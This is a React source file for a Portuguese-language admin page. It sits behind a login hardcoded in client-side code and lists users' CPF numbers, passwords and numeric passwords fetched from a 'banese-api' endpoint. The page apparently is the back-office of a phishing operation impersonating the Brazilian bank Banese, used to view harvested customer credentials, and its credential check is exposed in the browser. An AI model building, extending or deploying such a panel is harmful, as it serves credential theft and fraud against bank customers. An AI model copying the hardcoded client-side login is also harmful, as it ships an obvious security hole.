"use client"
import { useState, useEffect } from 'react';
import axios from 'axios';

const LoginPage = ({ onLogin }) => {
  const [login, setLogin] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = (e) => {
    e.preventDefault();
    if (login === 'BaneseCard' && password === 'BaneseCardSergipe753$') {
      onLogin(true);
    } else {
      alert('Credenciais inválidas. Tente novamente.');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-r from-teal-400 to-[#00C2A7]">
      <div className="bg-white p-8 rounded-xl shadow-lg w-full max-w-md md:max-w-lg mx-4 md:mx-auto animate-fade-in">
        <h2 className="text-3xl font-bold mb-6 text-center text-gray-800">Login</h2>
        <form onSubmit={handleLogin} className="flex flex-col gap-4">
          <input
            type="text"
            className="w-full p-3 border border-gray-300 rounded-lg text-center focus:outline-none focus:border-teal-500 mb-4"
            placeholder="Usuário"
            value={login}
            onChange={(e) => setLogin(e.target.value)}
          />
          <input
            type="password"
            className="w-full p-3 border border-gray-300 rounded-lg text-center focus:outline-none focus:border-teal-500 mb-4"
            placeholder="Senha"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button
            type="submit"
            className="mt-5 w-full p-3 text-white rounded-lg transition duration-200 font-semibold text-lg bg-[#00C2A7] hover:bg-[#00A591]"
            style={{ boxShadow: 'rgb(0, 0, 0) 0px 10px 10px -10px' }}
          >
            Entrar
          </button>
        </form>
      </div>
      <style jsx>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fadeIn 0.5s ease-in-out;
        }
      `}</style>
    </div>
  );
};

const AdminPage = () => {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [isLoggedIn, setIsLoggedIn] = useState(false);

  useEffect(() => {
    if (isLoggedIn) {
      const fetchUsers = async () => {
        try {
          const res = await axios.get('https://banese-api.vercel.app/api/users');
          setUsers(res.data);
        } catch (err) {
          setError(err.message);
        } finally {
          setLoading(false);
        }
      };

      fetchUsers();
    }
  }, [isLoggedIn]);

  if (!isLoggedIn) {
    return <LoginPage onLogin={setIsLoggedIn} />;
  }

  if (loading) {
    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
  }

  if (error) {
    return <div className="min-h-screen flex items-center justify-center">Error: {error}</div>;
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-r from-teal-400 to-[#00C2A7]">
      <div className="bg-white p-8 rounded-xl shadow-lg w-full max-w-4xl animate-fade-in md:mx-4">
        <h2 className="text-3xl font-bold mb-6 text-center text-gray-800">Registro de usuários</h2>
        <div className="overflow-x-auto">
          <table className="min-w-full bg-white table-fixed">
            <thead>
              <tr>
                <th className="py-2 px-4 border-b text-center">ID</th>
                <th className="py-2 px-4 border-b text-center">CPF</th>
                <th className="py-2 px-4 border-b text-center">Senha</th>
                <th className="py-2 px-4 border-b text-center">Senha Numérica</th>
              </tr>
            </thead>
            <tbody>
              {users.map((user) => (
                <tr key={user.id}>
                  <td className="py-2 px-4 border-b text-center">{user.id}</td>
                  <td className="py-2 px-4 border-b text-center">{user.cpf}</td>
                  <td className="py-2 px-4 border-b text-center">{user.password}</td>
                  <td className="py-2 px-4 border-b text-center">{user.passwordNumber || 'N/A'}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
      <style jsx>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fadeIn 0.5s ease-in-out;
        }
      `}</style>
    </div>
  );
};

export default AdminPage;
